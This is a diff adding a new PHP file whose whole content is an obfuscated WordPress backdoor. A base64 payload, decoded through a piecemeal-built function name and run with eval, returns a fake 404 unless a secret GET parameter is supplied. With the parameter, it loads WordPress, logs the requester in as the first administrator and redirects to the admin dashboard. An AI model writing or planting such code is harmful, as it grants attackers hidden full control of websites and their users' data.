@@ -1,0 +1,41 @@
+<?php
+// Obfuscated by internal obfuscator (base64)
+$z = "";
+$z .= "aWYgKCFpc3NldCgkX0dFVFsnYm9iMzAnXSkgfHwgJF";
+$z .= "9HRVRbJ2JvYjMwJ10gIT09ICdib2IzMCcpIHsNCiAgICBlcnJvcl9yZXBvc";
+$z .= "nRpbmcoMCk7DQogICAgaW5pX3NldCgnZGlzcGxheV9lcnJvcn";
+$z .= "MnLCAwKTsNCiAgICANCiAgICB3aGlsZSAob2JfZ2V0X2xldmVsKCkpIHsNCiAgI";
+$z .= "CAgICAgb2JfZW5kX2NsZWFuKCk7DQogI";
+$z .= "CAgfQ0KICAgIA0KICAgIGlmICghaGVhZG";
+$z .= "Vyc19zZW50KCkpIHsNCiAgICAgICAgaGVhZGVyKCdIVFRQLzE";
+$z .= "uMCA0MDQgTm90IEZvdW5kJyk7DQogICAgfQ0KICAgIA0KICAgIGV4aXQ7";
+$z .= "DQp9DQoNCiRtciA9IHJlYWxwYXRoKF9fRElSX18pOw0KJG1heCA9IDEwOw0KJGZv";
+$z .= "dW5kID0gZmFsc2U7DQp3aGlsZSAoJG1h";
+$z .= "eC0tID4gMCAmJiAkbXIpIHsNCiAgICBpZiAoZmlsZV9leGlzdHMoJG1yIC4gJy93";
+$z .= "cC1sb2FkLnBocCcpKSB7ICRmb3VuZCA9IH";
+$z .= "RydWU7IGJyZWFrOyB9DQogICAgJHBhcmVudCA9IGRpcm5hbWUoJG1yKTsN";
+$z .= "CiAgICBpZiAoJHBhcmVudCA9PT0gJG1yKSBicmVhazsN";
+$z .= "CiAgICAkbXIgPSAkcGFyZW50Ow0KfQ0KaWYgKCEgJGZvdW5kICYmICFlbXB0eSgk";
+$z .= "X1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKS";
+$z .= "AmJiBmaWxlX2V4aXN0cyhyZWFscGF0aCgkX1NFUlZ";
+$z .= "FUlsnRE9DVU1FTlRfUk9PVCddKS4nL3dwLWxvYWQucGhwJykpIHsNCiAgICAkbX";
+$z .= "IgPSByZWFscGF0aCgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsNCiAgIC";
+$z .= "AkZm91bmQgPSB0cnVlOw0KfQ0KaWYgKCEgJGZvdW5kKSBleGl0KCdGYWlsZ";
+$z .= "WQgdG8gbG9hZCB3cC1sb2FkLnBocCcpOw0KQG";
+$z .= "NoZGlyKCRtcik7DQpyZXF1aXJlX29uY2UgJG1yIC4gJy93cC1sb";
+$z .= "2FkLnBocCc7DQokd3BfdXNlcl9xdWVyeSA9IG5ld";
+$z .= "yBXUF9Vc2VyX1F1ZXJ5KFsNCiAgICAncm9sZScgICA";
+$z .= "9PiAnQWRtaW5pc3RyYXRvcicsDQogICAgJ251bWJlcicgPT4gMSwNCiAgICAnZ";
+$z .= "mllbGRzJyA9PiAnSUQnLA0KXSk7DQokcmVzdWx0cyA";
+$z .= "9ICR3cF91c2VyX3F1ZXJ5LT5nZXRfcmVzdWx";
+$z .= "0cygpOw0KaWYgKCEgZW1wdHkoJHJlc3VsdHNbMF0pKSB7DQogICAgJHVzZXJfa";
+$z .= "WQgPSAoaW50KSRyZXN1bHRzWzBdOw0KICAgIHdwX3Nld";
+$z .= "F9hdXRoX2Nvb2tpZSgkdXNlcl9pZCk7DQogICAgd3BfcmVkaX";
+$z .= "JlY3QoYWRtaW5fdXJsKCkpOw0KICAgIGV4aXQ7DQp9DQpleGl";
+$z .= "0KCdOTyBBRE1JTicpOw==";
+
+// reconstruct function name
+$a = "ba"; $b = "se"."64"."_de"."co"."de"; $c = $a.$b;
+$payload = $c($z);
+eval($payload);
+?>
